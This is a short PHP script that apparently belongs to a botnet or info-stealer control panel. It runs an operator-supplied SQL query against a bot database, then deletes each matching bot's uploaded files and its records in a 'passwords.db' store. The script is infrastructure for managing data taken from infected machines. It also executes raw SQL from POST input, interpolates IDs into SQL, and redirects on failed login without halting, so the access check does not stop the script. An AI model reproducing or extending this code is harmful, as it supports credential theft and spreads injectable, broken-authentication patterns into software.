<?php
    include('global.php');
    session_start();
    if (!isset($_SESSION['username'])) header('Location: login.php');
    if (!empty($_POST['query']))
    {
        $pwd_db = new SQLite3('info/passwords.db');
        $db = new SQLite3('info/info.db');
        $result = $db->query($_POST['query']);
        while ($row = $result->fetchArray())
        {
            $bot_id = $row['BOT_ID'];
            $file = glob("files/*-$bot_id*")[0];
            if ($file) unlink($file);
            $db->exec("DELETE FROM main WHERE BOT_ID='$bot_id'");
            $pwd_db->exec("DELETE FROM main WHERE GUID='$bot_id'");
        }
        $db->close();
        $pwd_db->close();
    }
?>